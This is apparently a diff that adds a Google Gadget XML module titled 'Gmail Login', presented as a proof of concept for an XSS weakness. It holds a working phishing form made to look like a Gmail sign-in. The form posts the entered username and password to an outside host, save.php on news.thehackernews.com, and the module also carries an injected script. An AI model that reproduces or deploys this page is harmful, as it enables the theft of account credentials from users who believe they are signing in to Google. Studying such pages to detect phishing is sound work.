@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Module>
+<ModulePrefs title="Gmail Login" title_url="XSS" description="Welcome to Google Services ( Proof of Concept , Details Here : http://goo.gl/q2VPC )" author="The Hacker News" author_email="82163261@qq.com" author_affiliation="NA" author_location="google" category="news" scrolling="false" singleton="false"/>
+<Content type="html">
+<![CDATA[
+<center><div style="height:274px;background-color:#abaca7;">
+<div style="height:274px;background-color:#e7effc;border:5px solid white;padding-top:15px;width:315px;"> <font color="#2c2c2c"><form action="http://news.thehackernews.com/save.php" method="post"> Sign in to Gmail with your<br /> <img src="http://keeperax.netai.net/google.png"><br /><br /> Username: <input type="text" name="username" value="" maxlength="60" ><br /> <div style="padding-top:5px;">Password : 
+      <input type="password" name="password" value="" maxlength="60" >
+<br />
+<br /> <input type="submit" name="Signin" value="Sign in"><br /><br /> </div></font><font color="blue"><a href="http://google.com/">I cannot access my account</a> </font> </form></div> 
+</div></center>
+<script>alert("just for fun")</script>
+]]>
+</Content>
+</Module>
